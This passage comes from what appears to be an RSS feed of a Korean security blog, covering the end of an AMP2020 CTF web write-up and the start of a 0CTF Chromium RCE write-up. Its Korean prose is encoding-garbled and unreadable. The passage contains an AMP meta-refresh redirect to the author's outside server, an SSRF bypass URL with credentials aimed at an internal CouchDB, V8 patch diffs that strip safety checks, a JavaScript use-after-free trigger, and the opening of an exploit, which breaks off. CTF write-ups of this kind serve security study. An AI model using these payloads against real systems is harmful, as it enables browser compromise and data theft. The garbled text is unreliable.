&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ë¬¸ì„œì—ì„œëŠ” ë¬´ì¡°ê±´ ì¶”ê°€í•´ì£¼ì–´ì•¼ í•œë‹¤ê³  ë‚˜ì™€ìˆì–´ì„œ ì•„ë˜ì˜ ì‹¤ì œ ë¬¸ì œ ì¶œì œìì˜ í’€ì´ì²˜ëŸ¼ ì´ìš©í•˜ì§€ëŠ” ì•Šì•˜ë‹¤. (ê¸°ì¡´ ë²„ì „ê³¼ í˜¸í™˜ì„±ì„ ìœ„í•´ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì¶”ê°€ë¥¼ ì•ˆí•´ì¤˜ë„ ë™ì‘ì„ í•œë‹¤ë‚˜â€¦)&lt;/p&gt;

&lt;p&gt;ì¶œì œìê°€ ì‚¬ìš©í•œ amp-ad íƒœê·¸( HTTP Request )&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &amp;lt;amp-ad
    width=&quot;728&quot;
    height=&quot;90&quot;
    type=&quot;f1h&quot;
    data-section-id=&quot;100&quot;
    data-slot=&quot;107&quot;
    data-custom='{&quot;my_custom_param&quot;:&quot;my_custom_value&quot;}'
    data-pubnetwork-lib=&quot;https://YOUR_WEBSITE&quot;
  &amp;gt;
  &amp;lt;/amp-ad&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰ì‹œí‚¬ ë°©ë²•ì„ ì°¾ê¸°ìœ„í•´ meta íƒœê·¸ë¥¼ ì´ìš©í•´ ë‚´ ì„œë²„ë¡œ ì´ë™ì‹œí‚¤ë ¤ê³  í•˜ì˜€ê³  ì‚½ì§ˆëì— ì•„ë˜ì™€ ê°™ì´ ì´ë™ì‹œí‚¬ ìˆ˜ ìˆì—ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;amp&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;lang=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;en&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;charset=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://cdn.ampproject.org/v0.js&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Hello, AMPs&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
    
    
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;noscript&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;style &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;amp-boilerplate&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;-webkit-animation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;none&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;-moz-animation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;none&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;-ms-animation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;none&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;animation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;none&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/style&amp;gt;&lt;/span&gt; 
      &lt;span class=&quot;c&quot;&gt;&amp;lt;!--  &amp;lt;/noscript&amp;gt; &amp;lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=http://wuq.kr/zxdasdzcz&quot;&amp;gt; --&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/noscript&amp;gt;&lt;/span&gt;
    
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;canonical&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://amp.dev/documentation/guides-and-tutorials/start/create/basic_markup/&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;viewport&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;width=device-width,minimum-scale=1,initial-scale=1&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;style &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;amp-boilerplate&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;-webkit-animation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;-amp-start&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;8s&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;steps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0s&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;normal&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;both&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;-moz-animation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;-amp-start&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;8s&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;steps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0s&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;normal&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;both&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;-ms-animation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;-amp-start&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;8s&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;steps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0s&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;normal&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;both&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;animation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;-amp-start&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;8s&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;steps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0s&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;normal&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;both&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;@-webkit-keyframes&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;-amp-start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;visibility&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hidden&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;visibility&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;visible&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;@-moz-keyframes&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;-amp-start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;visibility&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hidden&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;visibility&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;visible&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;@-ms-keyframes&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;-amp-start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;visibility&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hidden&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;visibility&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;visible&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;@-o-keyframes&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;-amp-start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;visibility&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hidden&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;visibility&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;visible&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;@keyframes&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;-amp-start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;visibility&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hidden&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;visibility&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;visible&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}}&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/style&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Welcome to the mobile web&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ìë°”ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìœ¼ë©´ ë‚´ë¶€ ì„œë²„ì— ë°ì´í„°ë¥¼ ìš”ì²­í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ CouchDB Web APIì— ì ‘ê·¼í•  ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;p&gt;APM2020 NodeJS ì†ŒìŠ¤ì—ì„œ IP ìš°íšŒë¥¼ í•˜ë ¤ë©´ ì•„ë˜ì™€ ê°™ì´ í•  ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;const parsed = new URL(url)
const parsed2 = new UrlParse(url)

(isIp(host2) &lt;span class=&quot;err&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; IP.isPublic(host) &lt;span class=&quot;err&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; IP.isPublic(host2))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://${database}:${password}@[::ffff:ac1e:103]:5984/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ê·¸ë¦¬ê³  NodeJS axios ì—ì„œ ì¸ìì— ë°°ì—´ì„ ì´ìš©í•´ ì˜µì…˜ì„ ì¶”ê°€í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ GET, POST, PUT ë©”ì†Œë“œ ë“±ì„ ì´ìš©í•´ CouchDB ì—ì„œ í”Œë˜ê·¸ë¥¼ ê°€ì ¸ì˜¤ë©´ ëœë‹¤.&lt;/p&gt;
</description>
        <pubDate>Mon, 01 Jun 2020 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/2020-06-01/AMP2020-writeup</link>
        <guid isPermaLink="true">http://localhost:4000/2020-06-01/AMP2020-writeup</guid>
        
        <category>ctf</category>
        
        <category>web</category>
        
        
      </item>
    
      <item>
        <title>0ctf Chromium RCE/SBX WriteUp</title>
        <description>&lt;p&gt;ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ì´ì˜ì£¼&lt;/p&gt;

&lt;h1 id=&quot;1-intro&quot;&gt;1. Intro&lt;/h1&gt;

&lt;p&gt;6ì›” 27ì¼ë¶€í„° 29ì¼ê¹Œì§€ ì§„í–‰ë˜ì—ˆë˜ 0CTF ë¬¸ì œì¤‘ Chromium RCE, Chromium SBX ë¬¸ì œì— ëŒ€í•œ WriteUpì…ë‹ˆë‹¤. ë‘ ë¬¸ì œëŠ” ê°€ì¥ ë¹ ë¥´ê²Œ í•´ê²°í•˜ì—¬ í¼ë¸”ì„ ë¨¹ì—ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;h1 id=&quot;2-rce--vulnerability&quot;&gt;2. RCE : Vulnerability&lt;/h1&gt;

&lt;div class=&quot;language-diff highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gh&quot;&gt;diff --git a/src/builtins/typed-array-set.tq b/src/builtins/typed-array-set.tq
index b5c9dcb261..babe7da3f0 100644
&lt;/span&gt;&lt;span class=&quot;gd&quot;&gt;--- a/src/builtins/typed-array-set.tq
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+++ b/src/builtins/typed-array-set.tq
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@@ -70,7 +70,7 @@&lt;/span&gt; TypedArrayPrototypeSet(
     // 7. Let targetBuffer be target.[[ViewedArrayBuffer]].
     // 8. If IsDetachedBuffer(targetBuffer) is true, throw a TypeError
     //   exception.
&lt;span class=&quot;gd&quot;&gt;-    const utarget = typed_array::EnsureAttached(target) otherwise IsDetached;
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+    const utarget = %RawDownCast&amp;lt;AttachedJSTypedArray&amp;gt;(target);
&lt;/span&gt;
     const overloadedArg = arguments[0];
     try {
&lt;span class=&quot;p&quot;&gt;@@ -86,8 +86,7 @@&lt;/span&gt; TypedArrayPrototypeSet(
       // 10. Let srcBuffer be typedArray.[[ViewedArrayBuffer]].
       // 11. If IsDetachedBuffer(srcBuffer) is true, throw a TypeError
       //   exception.
&lt;span class=&quot;gd&quot;&gt;-      const utypedArray =
-          typed_array::EnsureAttached(typedArray) otherwise IsDetached;
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+      const utypedArray = %RawDownCast&amp;lt;AttachedJSTypedArray&amp;gt;(typedArray);
&lt;/span&gt;
       TypedArrayPrototypeSetTypedArray(
           utarget, utypedArray, targetOffset, targetOffsetOverflowed)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;í•µì‹¬ì ì¸ diff ì½”ë“œëŠ” ìœ„ì™€ ê°™ìŠµë‹ˆë‹¤. íŒ¨ì¹˜ëŠ” TypedArrayPrototypeSet í•¨ìˆ˜ì—ì„œ ë˜ì—ˆìœ¼ë©° í•¨ìˆ˜ ì¤‘ê°„ì— detachedëœ array bufferë¥¼ zê²€ì‚¬í•˜ëŠ” ë£¨í‹´ì´ ì œê±°ë˜ì—ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-diff highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gh&quot;&gt;diff --git a/src/parsing/parser-base.h b/src/parsing/parser-base.h
index 3519599a88..f1ba0fb445 100644
&lt;/span&gt;&lt;span class=&quot;gd&quot;&gt;--- a/src/parsing/parser-base.h
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+++ b/src/parsing/parser-base.h
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@@ -1907,10 +1907,8 @@&lt;/span&gt; ParserBase&amp;lt;Impl&amp;gt;::ParsePrimaryExpression() {
       return ParseTemplateLiteral(impl()-&amp;gt;NullExpression(), beg_pos, false);

     case Token::MOD:
&lt;span class=&quot;gd&quot;&gt;-      if (flags().allow_natives_syntax() || extension_ != nullptr) {
-        return ParseV8Intrinsic();
-      }
-      break;
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+      // Directly call %ArrayBufferDetach without `--allow-native-syntax` flag
+      return ParseV8Intrinsic();
&lt;/span&gt;
     default:
       break;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ë˜í•œ d8ì—ì„œ arraybufferë¥¼ ë°”ë¡œ detach í•  ìˆ˜ ìˆë„ë¡ ìœ„ í•¨ìˆ˜ ë‚´ìš©ì´ ì¶”ê°€ë˜ì—ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ab&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ArrayBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint8Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint8Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;t1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fill&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;t2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fill&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;t2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;t1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;valueOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ArrayBufferDetach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì·¨ì•½ì ì€ ìœ„ ì½”ë“œë¡œ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. t1ì˜ ë²„í¼ë¥¼ t2ë¡œ ë³µì‚¬í•˜ëŠ” ê³¼ì •ì—ì„œ t1ì˜ ë²„í¼ë¥¼ detachí•˜ê²Œ ë˜ë©´ freeëœ ë‚´ìš©ì˜ ê°’ì´ t2ë¡œ ë³µì‚¬ë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;h1 id=&quot;3-rce--exploit&quot;&gt;3. RCE : Exploit&lt;/h1&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;convert&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ArrayBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;f64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Float64Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
